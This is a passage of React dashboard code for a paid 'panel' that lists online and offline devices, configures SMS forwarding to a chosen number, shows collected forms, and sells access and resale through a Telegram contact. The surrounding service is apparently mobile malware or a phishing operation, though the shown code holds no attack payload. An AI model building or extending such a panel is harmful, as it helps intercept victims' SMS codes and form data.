                        {daysRemaining !== null && daysRemaining <= 10000 && (
                          <span className="text-[10px] text-muted-foreground font-medium ml-auto">
                            {new Date(config.expiry_date).toLocaleDateString("en-US", { month: "short", day: "numeric" })}
                          </span>
                        )}
                      </motion.button>
                    )}

                    {/* Secondary account indicator */}
                    {isSecondaryAccount && (
                      <motion.div
                        initial={{ opacity: 0, y: 8 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.15 }}
                        className="w-full flex items-center gap-2.5 mt-4 px-4 py-2.5 rounded-[14px] bg-primary/5 border border-primary/15"
                      >
                        <ArrowRightLeft className="h-3.5 w-3.5 text-primary flex-shrink-0" />
                        <span className="text-[11px] font-bold text-primary">Secondary Account</span>
                        <span className="text-[10px] text-muted-foreground ml-auto">Linked Panel</span>
                      </motion.div>
                    )}

                    {/* Sync Accounts button */}
                    <motion.button
                      initial={{ opacity: 0, y: 6 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.2 }}
                      onClick={async () => {
                        setSyncing(true);
                        setSyncProgress("Starting...");
                        try {
                          const result = await syncSettingsToAllAccounts((current, total, label) => {
                            setSyncProgress(`Syncing ${label} (${current}/${total})`);
                          });
                          if (result.failed.length > 0) {
                            toast.error(`Failed: ${result.failed.join(", ")}`);
                          } else {
                            toast.success(`Synced to ${result.synced} accounts`);
                          }
                        } catch { toast.error("Sync failed"); }
                        setSyncing(false);
                        setSyncProgress("");
                      }}
                      disabled={syncing}
                      className="w-full flex items-center gap-2.5 mt-3 px-4 py-2.5 rounded-[14px] bg-primary/5 border border-primary/15 active:scale-[0.98] transition-all disabled:opacity-50"
                    >
                      <RefreshCw className={`h-3.5 w-3.5 text-primary flex-shrink-0 ${syncing ? "animate-spin" : ""}`} />
                      <span className="text-[11px] font-bold text-primary">{syncing ? "Syncing..." : "Sync All Accounts"}</span>
                    </motion.button>
                  </div>
                </motion.div>

                {/* Stats - glassmorphism cards */}
                <motion.div 
                  initial={{ opacity: 0, y: 15 }} 
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.05 }}
                  className="grid grid-cols-3 gap-2.5"
                >
                  {[
                    { value: userEntries.length, label: "Devices", icon: Smartphone, color: "text-primary", bg: "from-primary/15 to-primary/5", border: "border-primary/20" },
                    { value: onlineCount, label: "Online", icon: Activity, color: "text-green", bg: "from-green/15 to-green/5", border: "border-green/20" },
                    { value: offlineCount, label: "Offline", icon: WifiOff, color: "text-muted-foreground", bg: "from-muted/50 to-secondary/30", border: "border-border/40" },
                  ].map((s, i) => (
                    <motion.div 
                      key={s.label}
                      initial={{ opacity: 0, y: 15 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.08 + i * 0.05 }}
                      className={`rounded-2xl border ${s.border} bg-gradient-to-b ${s.bg} backdrop-blur-sm p-3.5 text-center`}
                    >
                      <div className={`h-8 w-8 rounded-xl bg-background/50 flex items-center justify-center mx-auto mb-2`}>
                        <s.icon className={`h-4 w-4 ${s.color}`} />
                      </div>
                      <p className={`text-2xl font-black ${s.color} tracking-tight leading-none`}>{s.value}</p>
                      <p className="text-[7px] text-muted-foreground font-bold uppercase tracking-[0.2em] mt-1">{s.label}</p>
                    </motion.div>
                  ))}
                </motion.div>

                {/* Quick Actions - rounded pill buttons */}
                <motion.div 
                  initial={{ opacity: 0, y: 15 }} 
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.1 }}
                  className="grid grid-cols-3 gap-2.5"
                >
                  {quickActions.map((a, i) => (
                    <motion.button 
                      key={a.label} 
                      onClick={() => navigate(a.path)}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.12 + i * 0.04 }}
                      className="rounded-2xl border border-border/30 bg-card/50 backdrop-blur-sm p-3.5 flex flex-col items-center gap-2 active:scale-[0.95] transition-all group"
                    >
                      <div className="h-11 w-11 rounded-[14px] bg-primary/10 group-active:bg-primary/20 flex items-center justify-center transition-colors">
                        <a.icon className="h-5 w-5 text-primary" />
                      </div>
                      <div className="text-center">
                        <p className="text-[11px] font-bold text-foreground">{a.label}</p>
                        <p className="text-[8px] text-muted-foreground leading-tight">{a.desc}</p>
                      </div>
                    </motion.button>
                  ))}
                </motion.div>

                {/* Action Cards */}
                <motion.div 
                  initial={{ opacity: 0, y: 15 }} 
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.15 }}
                  className="space-y-2"
                >
                  <button
                    onClick={() => setShowSmsForward(true)}
                    className="w-full rounded-2xl border border-border/30 bg-card/50 backdrop-blur-sm p-3.5 flex items-center justify-between group active:scale-[0.98] transition-all"
                  >
                    <div className="flex items-center gap-3">
                      <div className="h-10 w-10 rounded-xl bg-accent/12 flex items-center justify-center">
                        <ArrowRightLeft className="h-4.5 w-4.5 text-accent" />
                      </div>
                      <div className="text-left">
                        <p className="text-[13px] font-bold text-foreground">SMS Forwarding</p>
                        <p className="text-[10px] text-muted-foreground">
                          {smsForwardEnabled ? `→ ${smsForwardNumber || "—"}` : "Tap to configure"}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      {smsForwardEnabled && <span className="h-2 w-2 rounded-full bg-green" />}
                      <ChevronRight className="h-4 w-4 text-muted-foreground group-active:translate-x-0.5 transition-transform" />
                    </div>
                  </button>

                  <button onClick={() => navigate("/devices")}
                    className="w-full rounded-2xl border border-primary/15 bg-gradient-to-r from-primary/8 to-transparent backdrop-blur-sm p-3.5 flex items-center justify-between group active:scale-[0.98] transition-all">
                    <div className="flex items-center gap-3">
                      <div className="h-10 w-10 rounded-xl bg-primary/12 flex items-center justify-center">
                        <Smartphone className="h-4.5 w-4.5 text-primary" />
                      </div>
                      <div className="text-left">
                        <p className="text-[13px] font-bold text-foreground">All Devices</p>
                        <p className="text-[10px] text-muted-foreground">{onlineCount} active · {offlineCount} idle</p>
                      </div>
                    </div>
                    <ChevronRight className="h-4 w-4 text-primary group-active:translate-x-0.5 transition-transform" />
                  </button>
                </motion.div>

                {/* Access & Reseller — default account only */}
                {!isSecondaryAccount && (
                  <>
                    <motion.button
                      initial={{ opacity: 0, y: 15 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.2 }}
                      onClick={() => { setAccessModalMode("access"); setShowAccessModal(true); }}
                      className={`w-full rounded-2xl border ${daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? "border-destructive/30 bg-gradient-to-r from-destructive/10 to-destructive/5" : "border-yellow/20 bg-gradient-to-r from-yellow/8 to-primary/5"} backdrop-blur-sm p-3.5 flex items-center justify-between group active:scale-[0.98] transition-all`}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`h-10 w-10 rounded-xl flex items-center justify-center ${daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? "bg-destructive/12" : "bg-yellow/12"}`}>
                          {daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? (
                            <AlertTriangle className="h-4.5 w-4.5 text-destructive" />
                          ) : (
                            <KeyRound className="h-4.5 w-4.5 text-yellow" />
                          )}
                        </div>
                        <div className="text-left">
                          <p className="text-[13px] font-bold text-foreground">
                            {daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? "Renew Now" : "Extend Access"}
                          </p>
                          <p className="text-[10px] text-muted-foreground">
                            {daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0
                              ? `⚠ ${daysRemaining} day${daysRemaining !== 1 ? "s" : ""} left · About to expire`
                              : "Plans from $250"}
                          </p>
                        </div>
                      </div>
                      <ChevronRight className={`h-4 w-4 ${daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? "text-destructive" : "text-yellow"} group-active:translate-x-0.5 transition-transform`} />
                    </motion.button>

                    <motion.button
                      initial={{ opacity: 0, y: 15 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.22 }}
                      onClick={() => { setAccessModalMode("reseller"); setShowAccessModal(true); }}
                      className="w-full rounded-2xl border border-green/20 bg-gradient-to-r from-green/8 to-primary/5 backdrop-blur-sm p-3.5 flex items-center justify-between group active:scale-[0.98] transition-all"
                    >
                      <div className="flex items-center gap-3">
                        <div className="h-10 w-10 rounded-xl bg-green/12 flex items-center justify-center">
                          <Users className="h-4.5 w-4.5 text-green" />
                        </div>
                        <div className="text-left">
                          <p className="text-[13px] font-bold text-foreground">Become a Reseller</p>
                          <p className="text-[10px] text-muted-foreground">Just $99 · Earn 50% per sale</p>
                        </div>
                      </div>
                      <ChevronRight className="h-4 w-4 text-green group-active:translate-x-0.5 transition-transform" />
                    </motion.button>
                  </>
                )}

                {/* Capabilities */}
                <motion.div
                  initial={{ opacity: 0, y: 15 }} 
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.25 }}
                >
                  <div className="flex items-center gap-2 mb-3">
                    <Zap className="h-3.5 w-3.5 text-primary" />
                    <h2 className="text-[11px] font-black text-foreground uppercase tracking-wide">Capabilities</h2>
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    {features.map((f, i) => (
                      <motion.div 
                        key={f.label}
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        transition={{ delay: 0.3 + i * 0.04 }}
                        className="rounded-2xl border border-border/30 bg-card/40 backdrop-blur-sm p-3 flex items-center gap-2.5"
                      >
                        <div className="h-9 w-9 rounded-xl flex items-center justify-center flex-shrink-0"
                          style={{ backgroundColor: `${f.color}10`, border: `1px solid ${f.color}18` }}>
                          <f.icon className="h-4 w-4" style={{ color: f.color }} />
                        </div>
                        <div className="min-w-0">
                          <p className="text-[11px] font-bold text-foreground leading-tight">{f.label}</p>
                          <p className="text-[8px] text-muted-foreground leading-snug mt-0.5">{f.desc}</p>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </motion.div>

                {/* Premium CTA */}
                <motion.div 
                  initial={{ opacity: 0, y: 15 }} 
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.3 }}
                  className="relative rounded-[20px] border border-primary/15 overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.06] via-transparent to-accent/[0.04]" />
                  <div className="relative flex flex-col items-center gap-3 py-6 px-5">
                    <div className="px-3 py-1 rounded-full bg-primary/10 border border-primary/15">
                      <span className="text-[7px] font-black text-primary uppercase tracking-[0.3em]">Premium Panel</span>
                    </div>
                    <div className="flex items-baseline gap-1">
                      <span className="text-3xl font-black text-primary tracking-tighter">$499</span>
                      <span className="text-[10px] text-muted-foreground font-medium">/mo</span>
                    </div>
                    <div className="flex flex-wrap justify-center gap-1 text-[8px] text-muted-foreground">
                      {["Full Access", "∞ Devices", "Telegram", "2FA", "Updates"].map((f) => (
                        <span key={f} className="inline-flex items-center gap-0.5 px-2 py-0.5 rounded-lg bg-secondary/50 border border-border/30">
                          <span className="text-primary">✓</span> {f}
                        </span>
                      ))}
                    </div>
                    <a href="https://t.me/xylohu" target="_blank" rel="noopener noreferrer"
                      className="inline-flex items-center gap-2 px-5 py-2.5 rounded-2xl bg-primary text-primary-foreground text-xs font-bold shadow-[0_0_20px_hsl(var(--primary)/0.2)] active:scale-[0.96] transition-all">
                      <Send className="h-3.5 w-3.5" /> Contact @xylohu
                    </a>
                  </div>
                </motion.div>
              </div>
            </>
          )}
        </main>

        <AppDrawer open={drawerOpen} onClose={() => setDrawerOpen(false)} onOpenAllForms={() => setShowAllForms(true)} />
        {showAllForms && <AllFormsOverlay formsMap={formsMap} onClose={() => setShowAllForms(false)} />}
        <AccessModal open={showAccessModal} onClose={() => setShowAccessModal(false)} daysRemaining={daysRemaining} mode={accessModalMode} />

        {/* Floating Fox Button */}
        <motion.button
          onClick={() => navigate("/fox-dev")}
          className="fixed bottom-[8.5rem] right-4 lg:bottom-[4.5rem] lg:right-6 z-40 h-12 w-12 rounded-full overflow-hidden shadow-lg shadow-primary/30 active:scale-90 transition-transform border-2 border-primary/40"
          initial={{ scale: 0, rotate: -180 }}
          animate={{ scale: 1, rotate: 0 }}
          transition={{ type: "spring", stiffness: 200, delay: 0.3 }}
          whileTap={{ scale: 0.85 }}
        >
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSS9G9afOSbP4z8HJfGhhufxsn9oqJRX8YCw&s" alt="Fox" className="w-full h-full object-cover" />
        </motion.button>

        {/* Floating Help Button */}
        <motion.button
          onClick={() => navigate("/help")}
          className="fixed bottom-24 right-4 lg:bottom-6 lg:right-6 z-40 h-12 w-12 rounded-full bg-primary text-primary-foreground shadow-lg shadow-primary/30 flex items-center justify-center active:scale-90 transition-transform"
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", stiffness: 200, delay: 0.5 }}
          whileTap={{ scale: 0.85 }}
        >
          <HelpCircle className="h-5 w-5" />
        </motion.button>

      </div>

      {/* Sync blocking overlay */}
      {syncing && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 z-[9999] bg-background/90 backdrop-blur-md flex flex-col items-center justify-center gap-4"
        >
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ repeat: Infinity, duration: 1.2, ease: "linear" }}
          >
            <RefreshCw className="h-10 w-10 text-primary" />
          </motion.div>
          <p className="text-lg font-bold text-foreground">Syncing Accounts</p>
          <p className="text-sm text-muted-foreground animate-pulse">{syncProgress}</p>
          <p className="text-xs text-muted-foreground/60 mt-2">Please wait, do not close the app</p>
        </motion.div>
      )}
    </div>
  );
};

export default Index;